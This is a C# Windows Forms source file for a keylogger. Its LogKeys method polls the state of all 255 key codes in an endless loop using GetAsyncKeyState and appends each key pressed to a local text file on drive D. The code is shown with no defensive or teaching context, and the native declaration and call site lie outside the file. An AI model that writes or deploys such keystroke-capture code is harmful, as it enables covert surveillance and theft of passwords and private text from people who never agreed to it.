using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Runtime.InteropServices;
using System.Threading;
using System.IO;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace KeyLogger
{
    public partial class KeyLogger : Form
    {

        public KeyLogger()
        {
            InitializeComponent();
        }

        static void LogKeys()
        {
            String path = (@"D:\KeyLog.txt");

            if (!File.Exists(path))
            {
                using (StreamWriter sw = File.CreateText(path))
                {

                }
            }

            KeysConverter converter = new KeysConverter();
            String text = "";

            while (true)
            {
                Thread.Sleep(10);

                for (Int32 i = 0; i < 255; i++)
                {
                    int key = Program.GetAsyncKeyState(i);

                    if (key == 1 || key == -32767)
                    {
                        text = converter.ConvertToString(i);

                        using (StreamWriter sw = File.AppendText(path))
                        {
                            sw.WriteLine(text);

                        }
                        break;
                    }
                }
            }
        }
    }
}
